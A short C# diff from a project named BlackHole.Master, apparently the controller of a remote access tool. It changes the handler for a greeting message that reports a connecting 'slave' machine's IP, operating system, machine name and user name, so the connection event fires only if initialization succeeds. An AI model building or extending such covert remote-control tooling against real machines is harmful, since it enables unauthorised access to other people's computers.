@@ -191,8 +191,8 @@ namespace BlackHole.Master
                         .Match()
                         .With<GreetTheMasterMessage>(m =>
                         {
-                            ev.Source.Initialize(m.Ip, m.OperatingSystem, m.MachineName, m.UserName);
-                            FireSlaveConnected(ev.Source);
+                            if(ev.Source.Initialize(m.Ip, m.OperatingSystem, m.MachineName, m.UserName))
+                                FireSlaveConnected(ev.Source);
                         })
                         .With<PongMessage>(m =>
                         {
